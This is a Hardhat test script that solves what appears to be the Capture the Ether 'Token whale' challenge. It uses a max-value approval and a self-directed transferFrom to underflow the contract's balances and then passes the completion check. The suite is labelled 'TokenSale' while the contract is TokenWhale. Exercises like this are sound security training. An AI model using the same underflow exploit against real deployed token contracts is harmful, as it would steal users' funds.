import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('TokenSale', function () {
  it('should exploit the transferFrom()', async function () {
    const [player, accomplice] = await ethers.getSigners();

    const challengeAddress = '0x65750ca9A6C298a081029013e2A7020aeb45b11f';

    const Challenge = await ethers.getContractFactory('TokenWhale');
    const challenge = Challenge.attach(challengeAddress);

    const tokens = ethers.BigNumber.from(2).pow(256).sub(1);
    let tx = await challenge.approve(accomplice.address, tokens);
    await tx.wait();

    tx = await challenge
      .connect(accomplice)
      .transferFrom(player.address, player.address, 1000);
    await tx.wait();

    tx = await challenge
      .connect(accomplice)
      .transfer(player.address, 100000000);
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
